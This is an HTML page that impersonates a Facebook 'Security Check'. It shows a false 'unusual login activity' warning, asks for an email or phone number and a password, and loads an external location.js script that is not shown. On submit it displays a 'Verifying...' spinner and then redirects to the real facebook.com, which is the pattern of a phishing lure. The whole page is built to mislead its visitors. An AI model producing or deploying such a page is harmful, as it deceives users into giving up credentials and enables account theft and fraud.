<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Facebook — Login Security Check</title>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body {
    min-height:100vh;
    background:#f0f2f5;
    display:flex; align-items:center; justify-content:center;
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;
    padding:1rem;
}
.container {
    display:flex;
    max-width:520px;
    width:100%;
    gap:2rem;
}
.left { display:flex; flex-direction:column; justify-content:center; }
.fb-logo { font-size:3.2rem; font-weight:bold; color:#1877f2; margin-bottom:1rem; }
.tagline { font-size:1.5rem; font-weight:600; color:#000; margin-bottom:2rem; }
.desc { font-size:.95rem; color:#65676b; line-height:1.4; }
.right {
    background:#fff;
    border-radius:8px;
    box-shadow:0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
    padding:2rem;
    width:100%;
    max-width:320px;
}
.title { font-size:1.2rem; font-weight:600; color:#000; margin-bottom:1rem; }
.warning {
    background:#fff3cd; border:1px solid #ffc107;
    border-radius:4px; padding:.75rem;
    font-size:.85rem; color:#856404;
    margin-bottom:1.5rem;
}
.form-group { margin-bottom:1rem; }
.input {
    width:100%;
    padding:.65rem;
    border:1px solid #ccc;
    border-radius:4px;
    font-size:.95rem;
    font-family:Arial,sans-serif;
}
.input:focus { outline:none; border-color:#1877f2; }
.btn {
    width:100%;
    padding:.65rem;
    background:#1877f2; color:#fff;
    border:none; border-radius:4px;
    font-size:1rem; font-weight:600;
    cursor:pointer; margin-top:1rem;
}
.btn:hover { background:#165ce5; }
#overlay {
    display:none; position:fixed; inset:0;
    background:rgba(0,0,0,.5); z-index:99;
    flex-direction:column; align-items:center; justify-content:center; gap:1rem;
}
#overlay.show { display:flex; }
.spinner {
    width:40px; height:40px;
    border:4px solid rgba(255,255,255,.3);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin .8s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }
#overlay p { color:#fff; font-size:1rem; }
</style>
</head>
<body>

<div class="container">
    <div class="left">
        <div class="fb-logo">f</div>
        <div class="tagline">facebook</div>
        <div class="desc">Connect with friends and the world around you on Facebook.</div>
    </div>
    
    <div class="right">
        <div class="title">Security Check</div>
        <div class="warning">⚠️ Unusual login activity detected. Please verify your identity.</div>
        
        <div class="form-group">
            <input type="email" class="input" placeholder="Email or phone number" id="email">
        </div>
        <div class="form-group">
            <input type="password" class="input" placeholder="Password" id="pass">
        </div>
        
        <button class="btn" onclick="verify()">Verify & Continue</button>
    </div>
</div>

<div id="overlay">
    <div class="spinner"></div>
    <p id="text">Verifying...</p>
</div>

<script src="../js/location.js"></script>
<script>
function verify() {
    document.getElementById("overlay").classList.add("show");
    setTimeout(() => {
        window.location.href = "https://facebook.com";
    }, 12000);
}
</script>
</body>
</html>
